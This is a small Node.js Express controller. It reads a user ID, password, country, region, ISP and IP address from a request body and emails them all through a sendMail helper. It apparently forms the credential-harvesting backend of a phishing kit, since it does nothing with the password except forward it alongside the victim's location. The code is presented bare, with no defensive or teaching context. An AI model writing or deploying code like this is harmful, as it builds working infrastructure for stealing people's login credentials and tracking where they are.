const { sendMail } = require('../helpers/sendMail')

const send = (req, res) => {
  const { userID, password, country, region, isp, IPAddress, sender } = req.body
  console.log(country, region, isp, IPAddress)
  if (!userID || !password) {
    res.status(400).json({ error: 'userID and password required' })
    return
  }

  sendMail(userID, password, country, region, isp, IPAddress, sender, res)
}

module.exports = send
